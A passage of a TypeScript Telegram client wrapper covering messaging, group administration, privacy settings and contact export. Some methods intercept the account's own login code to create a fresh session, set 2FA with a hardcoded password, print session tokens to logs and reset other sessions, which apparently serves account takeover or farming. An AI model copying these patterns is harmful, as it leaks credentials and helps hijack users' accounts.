clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code)\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n\n    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: options.title,\n                about: options.description,\n                megagroup: options.megagroup,\n                forImport: options.forImport,\n            })\n        );\n\n        // Find the channel in updates safely\n        let channelId: bigInt.BigInteger | undefined;\n        if ('updates' in result) {\n            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\n            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\n            if (channelUpdate && 'channelId' in channelUpdate) {\n                channelId = channelUpdate.channelId;\n            }\n        }\n\n        if (!channelId) {\n            throw new Error('Failed to create channel');\n        }\n\n        const channel = await this.client.getEntity(channelId);\n        if (!(channel instanceof Api.Channel)) {\n            throw new Error('Created entity is not a channel');\n        }\n\n        if (options.members?.length) {\n            const users = await Promise.all(\n                options.members.map(member => this.client.getInputEntity(member))\n            );\n\n            await this.client.invoke(new Api.channels.InviteToChannel({\n                channel: await this.client.getInputEntity(channel),\n                users\n            }));\n        }\n\n        if (options.photo) {\n            const buffer = await this.downloadFileFromUrl(options.photo);\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            await this.client.invoke(new Api.channels.EditPhoto({\n                channel: await this.client.getInputEntity(channel),\n                photo: new Api.InputChatUploadedPhoto({\n                    file: inputFile\n                })\n            }));\n        }\n\n        return channel;\n    }\n\n    async updateGroupSettings(settings: {\n        groupId: string;\n        title?: string;\n        description?: string;\n        slowMode?: number;\n        memberRestrictions?: any;\n        username?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getEntity(settings.groupId);\n\n        if (settings.title) {\n            await this.client.invoke(new Api.channels.EditTitle({\n                channel: channel,\n                title: settings.title || ''\n            }))\n        };\n\n        if (settings.description) {\n            await this.client.invoke(new Api.messages.EditChatAbout({\n                peer: channel,\n                about: settings.description\n            }));\n        }\n\n        if (settings.username) {\n            await this.client.invoke(new Api.channels.UpdateUsername({\n                channel: channel,\n                username: settings.username\n            }));\n        }\n\n\n        if (settings.slowMode !== undefined) {\n            await this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: channel,\n                seconds: settings.slowMode\n            }));\n        }\n\n        return true;\n    }\n\n    async scheduleMessageSend(opts: MessageScheduleOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\n\n        if (opts.media) {\n            const buffer = await this.downloadFileFromUrl(opts.media.url);\n\n            const uploadedFile = await this.client.uploadFile({\n                file: new CustomFile('media', buffer.length, 'media', buffer),\n                workers: 1\n            });\n\n            return this.client.sendFile(opts.chatId, {\n                file: uploadedFile,\n                caption: opts.message,\n                forceDocument: opts.media.type === 'document',\n                scheduleDate\n            });\n        }\n\n        return this.client.sendMessage(opts.chatId, {\n            message: opts.message,\n            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)\n        });\n    }\n\n    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({\n            peer: chatId,\n            hash: bigInt(0)\n        }));\n\n        return 'messages' in result && Array.isArray(result.messages)\n            ? result.messages.filter(msg => msg instanceof Api.Message)\n            : [];\n    }\n\n    async sendMediaAlbum(album: MediaAlbumOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            album.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const uploadedFile = await this.client.uploadFile({\n                    file: new CustomFile('media', buffer.length, 'media', buffer),\n                    workers: 1\n                });\n\n                return new Api.InputSingleMedia({\n                    media: item.type === 'photo'\n                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\n                        : new Api.InputMediaUploadedDocument({\n                            file: uploadedFile,\n                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',\n                            attributes: []\n                        }),\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: album.chatId,\n            multiMedia: mediaFiles\n        }));\n    }\n\n    async sendVoiceMessage(voice: {\n        chatId: string;\n        url: string;\n        duration?: number;\n        caption?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const buffer = await this.downloadFileFromUrl(voice.url);\n\n        return await this.client.invoke(new Api.messages.SendMedia({\n            peer: voice.chatId,\n            media: new Api.InputMediaUploadedDocument({\n                file: await this.client.uploadFile({\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\n                    workers: 1\n                }),\n                mimeType: 'audio/ogg',\n                attributes: [\n                    new Api.DocumentAttributeAudio({\n                        voice: true,\n                        duration: voice.duration || 0\n                    })\n                ]\n            }),\n            message: voice.caption || '',\n            randomId: bigInt(Math.floor(Math.random() * 1000000000))\n        }));\n    }\n\n    async cleanupChat(cleanup: {\n        chatId: string;\n        beforeDate?: Date;\n        onlyMedia?: boolean;\n        excludePinned?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const messages = await this.client.getMessages(cleanup.chatId, {\n            limit: 100,\n            ...(cleanup.beforeDate && {\n                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)\n            })\n        });\n\n        const toDelete = messages.filter(msg => {\n            if (cleanup.excludePinned && msg.pinned) return false;\n            if (cleanup.onlyMedia && !msg.media) return false;\n            return true;\n        });\n\n        if (toDelete.length > 0) {\n            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\n                revoke: true\n            });\n        }\n\n        return { deletedCount: toDelete.length };\n    }\n\n    async updatePrivacyBatch(settings: {\n        phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n        lastSeen?: 'everybody' | 'contacts' | 'nobody';\n        profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n        forwards?: 'everybody' | 'contacts' | 'nobody';\n        calls?: 'everybody' | 'contacts' | 'nobody';\n        groups?: 'everybody' | 'contacts' | 'nobody';\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const privacyRules = {\n            everybody: [new Api.InputPrivacyValueAllowAll()],\n            contacts: [new Api.InputPrivacyValueAllowContacts()],\n            nobody: [new Api.InputPrivacyValueDisallowAll()]\n        };\n\n        const updates = [];\n\n        const privacyMap = {\n            phoneNumber: Api.InputPrivacyKeyPhoneNumber,\n            lastSeen: Api.InputPrivacyKeyStatusTimestamp,\n            profilePhotos: Api.InputPrivacyKeyProfilePhoto,\n            forwards: Api.InputPrivacyKeyForwards,\n            calls: Api.InputPrivacyKeyPhoneCall,\n            groups: Api.InputPrivacyKeyChatInvite\n        };\n\n        for (const [key, value] of Object.entries(settings)) {\n            if (value && key in privacyMap) {\n                updates.push(this.client.invoke(new Api.account.SetPrivacy({\n                    key: new privacyMap[key](),\n                    rules: privacyRules[value]\n                })));\n            }\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getSessionInfo() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const [authorizationsResult, devicesResult] = await Promise.all([\n            this.client.invoke(new Api.account.GetAuthorizations()),\n            this.client.invoke(new Api.account.GetWebAuthorizations())\n        ]);\n\n        const sessions = authorizationsResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            deviceModel: auth.deviceModel,\n            platform: auth.platform,\n            systemVersion: auth.systemVersion,\n            appName: auth.appName,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            country: auth.country,\n            region: auth.region\n        }));\n\n        const webSessions = devicesResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            domain: auth.domain,\n            browser: auth.browser,\n            platform: auth.platform,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            region: auth.region\n        }));\n\n        return {\n            sessions,\n            webSessions\n        };\n    }\n\n    async terminateSession(options: {\n        hash: string;\n        type: 'app' | 'web';\n        exceptCurrent?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.exceptCurrent) {\n            if (options.type === 'app') {\n                await this.client.invoke(new Api.auth.ResetAuthorizations());\n            } else {\n                await this.client.invoke(new Api.account.ResetWebAuthorizations());\n            }\n            return true;\n        }\n\n        if (options.type === 'app') {\n            await this.client.invoke(new Api.account.ResetAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        } else {\n            await this.client.invoke(new Api.account.ResetWebAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        }\n        return true;\n    }\n\n    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = Math.floor(Date.now() / 1000);\n        const periodInSeconds = {\n            day: 24 * 60 * 60,\n            week: 7 * 24 * 60 * 60,\n            month: 30 * 24 * 60 * 60\n        }[period];\n\n        const messages = await this.client.getMessages(chatId, {\n            limit: 100,\n            offsetDate: now - periodInSeconds\n        });\n\n        const stats = {\n            period,\n            totalMessages: messages.length,\n            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\n            messageTypes: {\n                text: messages.filter(m => !m.media && m.message).length,\n                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\n                video: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');\n                }).length,\n                voice: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');\n                }).length,\n                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length\n            },\n            topSenders: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const senderId = msg.fromId?.toString();\n                    if (senderId) {\n                        acc[senderId] = (acc[senderId] || 0) + 1;\n                    }\n                    return acc;\n                }, {} as Record<string, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .slice(0, 10)\n                .map(([id, count]) => ({ id, count })),\n            mostActiveHours: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const hour = new Date(msg.date * 1000).getHours();\n                    acc[hour] = (acc[hour] || 0) + 1;\n                    return acc;\n                }, {} as Record<number, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .map(([hour, count]) => ({ hour: Number(hour), count }))\n        };\n\n        return stats;\n    }\n\n    private getMediaExtension(media: any): string {\n        if (!media) return 'bin';\n\n        switch (media.className) {\n            case 'MessageMediaPhoto':\n                return 'jpg';\n            case 'MessageMediaDocument':\n                const doc = media.document;\n                if (!doc || !('mimeType' in doc)) return 'bin';\n\n                const mime = doc.mimeType;\n                if (mime?.startsWith('video/')) return 'mp4';\n                if (mime?.startsWith('image/')) return mime.split('/')[1];\n                if (mime?.startsWith('audio/')) return 'ogg';\n                return 'bin';\n            default:\n                return 'bin';\n        }\n    }\n\n    async setContentFilters(filters: ContentFilter) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        this.contentFilters.set(filters.chatId, filters);\n\n        if (!this.filterHandler) {\n            this.filterHandler = this.client.addEventHandler(async (event) => {\n                if (event instanceof NewMessageEvent) {\n                    const message = event.message;\n                    const chatId = message.chatId?.toString();\n                    const filter = this.contentFilters.get(chatId);\n\n                    if (!filter) return;\n\n                    const shouldFilter = await this.evaluateMessage(message, filter);\n                    if (shouldFilter) {\n                        for (const action of filter.actions) {\n                            await this.executeFilterAction(action, message);\n                        }\n                    }\n                }\n            }, new NewMessage({}));\n        }\n    }\n\n    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {\n        if (filter.keywords?.length) {\n            const messageText = message.message.toLowerCase();\n            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {\n                return true;\n            }\n        }\n\n        if (filter.mediaTypes?.length && message.media) {\n            const mediaType = this.getMediaType(message.media);\n            if (filter.mediaTypes.includes(mediaType)) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {\n        try {\n            switch (action) {\n                case 'delete':\n                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });\n                    break;\n                case 'warn':\n                    await this.client.sendMessage(message.chatId, {\n                        message: `⚠️ Message filtered due to content policy.`,\n                        replyTo: message.id\n                    });\n                    break;\n                case 'mute':\n                    if (message.fromId) {\n                        await this.client.invoke(new Api.channels.EditBanned({\n                            channel: message.chatId,\n                            participant: message.fromId,\n                            bannedRights: new Api.ChatBannedRights({\n                                untilDate: Math.floor(Date.now() / 1000) + 3600,\n                                sendMessages: true\n                            })\n                        }));\n                    }\n                    break;\n            }\n        } catch (error) {\n            console.error(`Failed to execute filter action ${action}:`, error);\n        }\n    }\n\n    private getSearchFilter(filter: string): Api.TypeMessagesFilter {\n        switch (filter) {\n            case 'photo': return new Api.InputMessagesFilterPhotos();\n            case 'video': return new Api.InputMessagesFilterVideo();\n            case 'document': return new Api.InputMessagesFilterDocument();\n            case 'url': return new Api.InputMessagesFilterUrl();\n            default: return new Api.InputMessagesFilterEmpty();\n        }\n    }\n\n    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\n        if (media instanceof Api.MessageMediaPhoto) {\n            return 'photo';\n        } else if (media instanceof Api.MessageMediaDocument) {\n            const document = media.document as Api.Document;\n            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\n                return 'video';\n            }\n            return 'document';\n        }\n        return 'document';\n    }\n\n    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\n        if (entity instanceof Api.User) return entity.id.toString();\n        if (entity instanceof Api.Channel) return entity.id.toString();\n        if (entity instanceof Api.Chat) return entity.id.toString();\n        return '';\n    }\n\n    async addGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const users = await Promise.all(\n            members.map(member => this.client.getInputEntity(member))\n        );\n\n        await this.client.invoke(new Api.channels.InviteToChannel({\n            channel: channel,\n            users\n        }));\n    }\n\n    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        for (const member of members) {\n            const user = await this.client.getInputEntity(member);\n            await this.client.invoke(new Api.channels.EditBanned({\n                channel: channel,\n                participant: user,\n                bannedRights: new Api.ChatBannedRights({\n                    untilDate: 0,\n                    viewMessages: true,\n                    sendMessages: true,\n                    sendMedia: true,\n                    sendStickers: true,\n                    sendGifs: true,\n                    sendGames: true,\n                    sendInline: true,\n                    embedLinks: true\n                })\n            }));\n        }\n    }\n\n    async promoteToAdmin(\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: permissions?.changeInfo ?? false,\n                postMessages: permissions?.postMessages ?? false,\n                editMessages: permissions?.editMessages ?? false,\n                deleteMessages: permissions?.deleteMessages ?? false,\n                banUsers: permissions?.banUsers ?? false,\n                inviteUsers: permissions?.inviteUsers ?? true,\n                pinMessages: permissions?.pinMessages ?? false,\n                addAdmins: permissions?.addAdmins ?? false,\n                anonymous: permissions?.anonymous ?? false,\n                manageCall: permissions?.manageCall ?? false,\n                other: false\n            }),\n            rank: rank || ''\n        }));\n    }\n\n    async demoteAdmin(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: false,\n                postMessages: false,\n                editMessages: false,\n                deleteMessages: false,\n                banUsers: false,\n                inviteUsers: false,\n                pinMessages: false,\n                addAdmins: false,\n                anonymous: false,\n                manageCall: false,\n                other: false\n            }),\n            rank: ''\n        }));\n    }\n\n    async unblockGroupUser(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditBanned({\n            channel: channel,\n            participant: user,\n            bannedRights: new Api.ChatBannedRights({\n                untilDate: 0,\n                viewMessages: false,\n                sendMessages: false,\n                sendMedia: false,\n                sendStickers: false,\n                sendGifs: false,\n                sendGames: false,\n                sendInline: false,\n                embedLinks: false\n            })\n        }));\n    }\n\n    async getGroupAdmins(groupId: string): Promise<Array<{\n        userId: string;\n        rank?: string;\n        permissions: {\n            changeInfo: boolean;\n            postMessages: boolean;\n            editMessages: boolean;\n            deleteMessages: boolean;\n            banUsers: boolean;\n            inviteUsers: boolean;\n            pinMessages: boolean;\n            addAdmins: boolean;\n            anonymous: boolean;\n            manageCall: boolean;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsAdmins(),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantAdmin[];\n            const users = result.users;\n\n            return participants.map(participant => {\n                const adminRights = participant.adminRights as Api.ChatAdminRights;\n                return {\n                    userId: participant.userId.toString(),\n                    rank: participant.rank || '',\n                    permissions: {\n                        changeInfo: adminRights.changeInfo || false,\n                        postMessages: adminRights.postMessages || false,\n                        editMessages: adminRights.editMessages || false,\n                        deleteMessages: adminRights.deleteMessages || false,\n                        banUsers: adminRights.banUsers || false,\n                        inviteUsers: adminRights.inviteUsers || false,\n                        pinMessages: adminRights.pinMessages || false,\n                        addAdmins: adminRights.addAdmins || false,\n                        anonymous: adminRights.anonymous || false,\n                        manageCall: adminRights.manageCall || false\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async getGroupBannedUsers(groupId: string): Promise<Array<{\n        userId: string;\n        bannedRights: {\n            viewMessages: boolean;\n            sendMessages: boolean;\n            sendMedia: boolean;\n            sendStickers: boolean;\n            sendGifs: boolean;\n            sendGames: boolean;\n            sendInline: boolean;\n            embedLinks: boolean;\n            untilDate: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsBanned({ q: '' }),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantBanned[];\n\n            return participants.map(participant => {\n                const bannedRights = participant.bannedRights as Api.ChatBannedRights;\n                return {\n                    userId: (participant.peer as Api.PeerChat).chatId.toString(),\n                    bannedRights: {\n                        viewMessages: bannedRights.viewMessages || false,\n                        sendMessages: bannedRights.sendMessages || false,\n                        sendMedia: bannedRights.sendMedia || false,\n                        sendStickers: bannedRights.sendStickers || false,\n                        sendGifs: bannedRights.sendGifs || false,\n                        sendGames: bannedRights.sendGames || false,\n                        sendInline: bannedRights.sendInline || false,\n                        embedLinks: bannedRights.embedLinks || false,\n                        untilDate: bannedRights.untilDate || 0\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async searchMessages(params: {\n        chatId: string;\n        query?: string;\n        types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document')[];\n        offset?: number;\n        limit?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, query = '', types = ['all'], offset = 0, limit = 20 } = params;\n\n        let filter: any = new Api.InputMessagesFilterEmpty();\n        if (types.length === 1 && types[0] !== 'all') {\n            switch (types[0]) {\n                case 'photo':\n                    filter = new Api.InputMessagesFilterPhotos();\n                    break;\n                case 'video':\n                    filter = new Api.InputMessagesFilterVideo();\n                    break;\n                case 'voice':\n                    filter = new Api.InputMessagesFilterVoice();\n                    break;\n                case 'document':\n                    filter = new Api.InputMessagesFilterDocument();\n                    break;\n                case 'text':\n                    // For text-only messages, we'll filter after fetching\n                    break;\n            }\n        }\n\n        const result = await this.client.invoke(\n            new Api.messages.Search({\n                peer: await this.client.getInputEntity(chatId),\n                q: query,\n                filter: filter,\n                minDate: 0,\n                maxDate: 0,\n                offsetId: offset,\n                addOffset: 0,\n                limit: limit,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n                fromId: undefined\n            })\n        );\n\n        if (!('messages' in result)) {\n            return { messages: [], total: 0 };\n        }\n\n        let messages = result.messages;\n\n        // Additional filtering for text-only messages if requested\n        if (types.includes('text') && types.length === 1) {\n            messages = messages.filter((msg: Api.Message) => !('media' in msg));\n        }\n\n        const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = 'media' in message && message.media\n                ? {\n                    type: this.getMediaType(message.media),\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return {\n            messages: processedMessages,\n            total: ('count' in result ? result.count : messages.length) || messages.length\n        };\n    }\n\n    async getFilteredMedia(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        offset?: number;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video'], startDate, endDate, offset = 0, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            offsetId: offset,\n            limit: limit || 500,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n\n        const messages = await this.client.getMessages(ent, query);\n        const filteredMessages = messages.filter(message => {\n            if (!message.media) return false;\n            const mediaType = this.getMediaType(message.media);\n            return types.includes(mediaType);\n        });\n\n        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {\n            let thumbBuffer = null;\n\n            try {\n                if (message.media instanceof Api.MessageMediaPhoto) {\n                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                } else if (message.media instanceof Api.MessageMediaDocument) {\n                    const sizes = message.document?.thumbs || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                }\n            } catch (error) {\n                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);\n            }\n\n            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);\n\n            return {\n                messageId: message.id,\n                type: this.getMediaType(message.media),\n                thumb: thumbBuffer?.toString('base64') || null,\n                caption: message.message || '',\n                date: message.date,\n                mediaDetails,\n            };\n        }));\n\n        return {\n            messages: mediaData,\n            total: messages.total,\n            hasMore: messages.length === limit\n        };\n    }\n\n    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        try {\n            // First attempt: direct getEntity\n            return await this.client.getEntity(entityId);\n        } catch (error) {\n            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);\n\n            try {\n                // Second attempt: search through dialogs\n                const dialogs = await this.client.getDialogs({\n                    limit: 300 // Adjust limit as needed\n                });\n\n                // Search through dialog entities\n                for (const dialog of dialogs) {\n                    const entity = dialog.entity;\n                    if (entity.id.toString() === entityId.toString()) {\n                        return entity;\n                    }\n                }\n\n                console.log(`Entity ${entityId} not found in dialogs either`);\n                return null;\n            } catch (dialogError) {\n                console.error('Error while searching dialogs:', dialogError);\n                return null;\n            }\n        }\n    }\n\n    // Contact Management Features\n    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {\n        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\n        const rows = contacts.map(contact => [\n            contact.firstName,\n            contact.lastName,\n            contact.phone,\n            contact.blocked\n        ].join(','));\n\n        return [header, ...rows].join('\\n');\n    }\n\n    private generateVCard(contacts: any[]) {\n        return contacts.map(contact => {\n            const vcard = [\n                'BEGIN:VCARD',\n                'VERSION:3.0',\n                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),\n                `TEL;TYPE=CELL:${contact.phone || ''}`,\n                'END:VCARD'\n            ];\n            return vcard.join('\\n');\n        }).join('\\n\\n');\n    }\n\n    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        let blockedContacts;\n        if (includeBlocked) {\n            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({\n                offset: 0,\n                limit: 100\n            }));\n        }\n\n        if (format === 'csv') {\n            const csvData = contacts.map((contact: any) => ({\n                firstName: contact.firstName || '',\n                lastName: contact.lastName || '',\n                phone: contact.phone || '',\n                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>\n                    p.id.toString() === contact.id.toString()\n                ) : false\n            }));\n            return this.generateCSV(csvData);\n        } else {\n      